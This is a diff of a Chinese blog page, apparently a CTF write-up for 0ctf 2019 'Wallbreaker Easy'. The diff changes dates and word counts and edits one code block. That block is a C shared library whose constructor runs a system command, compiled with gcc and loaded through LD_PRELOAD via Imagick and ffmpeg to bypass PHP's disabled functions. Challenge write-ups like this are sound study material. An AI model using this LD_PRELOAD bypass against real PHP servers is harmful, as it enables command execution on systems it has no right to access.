@@ -91,7 +91,7 @@
 <meta property="og:description" content="前言：菜是原罪这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。 在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。 主要思路利用Imagick()中会触发php解释器向外开启系统进程的方法，这里的思路是当传入MPEG格式类型的文件时候，为了转换格式会向外部环境请求并触发ffmpeg的调用，从而开启新的进程。在开启时，环境变量LD_PRELOAD会首先加载，而我们">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png">
-<meta property="og:updated_time" content="2019-07-04T08:41:56.000Z">
+<meta property="og:updated_time" content="2019-11-21T01:36:34.422Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0ctf 2019 web Wallbreaker Easy">
 <meta name="twitter:description" content="前言：菜是原罪这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。 在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。 主要思路利用Imagick()中会触发php解释器向外开启系统进程的方法，这里的思路是当传入MPEG格式类型的文件时候，为了转换格式会向外部环境请求并触发ffmpeg的调用，从而开启新的进程。在开启时，环境变量LD_PRELOAD会首先加载，而我们">
@@ -335,8 +335,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-07-04T16:41:56+08:00">
-                2019-07-04
+              <time title="Post modified" itemprop="dateModified" datetime="2019-11-21T09:36:34+08:00">
+                2019-11-21
               </time>
             
           </span>
@@ -385,7 +385,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  623
+                  622
                 </span>
               
 
@@ -430,7 +430,7 @@
 
 <p>脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。</p>
 <p>然后服务器上面的<code>hack.c</code>文件如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ef757c06e983a137384378f47607abfa/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件。在服务器目录下面开启<code>python -m SimpleHTTPServer 80</code>，并运行上述python脚本，即可看到flag。</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png" alt="flag"></p>
@@ -730,7 +730,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">53.3k</span>
+    <span title="Site words total count">57.2k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
